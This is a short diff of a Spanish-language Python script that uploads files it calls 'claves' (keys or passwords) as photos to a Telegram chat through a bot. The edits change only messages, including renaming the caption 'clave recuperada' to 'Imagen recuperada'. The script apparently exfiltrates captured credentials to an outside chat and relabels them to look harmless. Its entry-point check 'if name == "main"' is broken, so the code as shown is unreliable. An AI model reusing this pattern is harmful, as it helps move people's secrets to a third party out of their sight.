@@ -30,7 +30,7 @@ async def enviar_fotos_telegram():
         ]
         
         if not archivos:
-            print("⚠️ No se encontraron claves para enviar.")
+            print("⚠️ No se encontraron claves ")
             return
 
         print(f"📸 Se encontraron {len(archivos)} claves. Iniciando envío...")
@@ -45,7 +45,7 @@ async def enviar_fotos_telegram():
                     await bot.send_photo(
                         chat_id=CHAT_ID, 
                         photo=foto, 
-                        caption=f"clave recuperada: {nombre_archivo}"
+                        caption=f"Imagen recuperada: {nombre_archivo}"
                     )
                 
                 # Pausa para evitar el baneo de Telegram por spam
@@ -54,10 +54,10 @@ async def enviar_fotos_telegram():
             except Exception as e:
                 print(f"❌ Error al enviar clave ")
 
-        print("\n✅ ¡Proceso finalizado!")
+        print("\n✅ ¡Proceso de claves!")
 
     except TelegramError as e:
-        print(f"❌ Error")
+        print(f"❌ Error de clave")
     except Exception as e:
         print(f"❌ Error general: {e}")
 
@@ -66,4 +66,3 @@ if name == "main":
         asyncio.run(enviar_fotos_telegram())
     except KeyboardInterrupt:
         print("\n🛑 Proceso detenido por el usuario.")
-
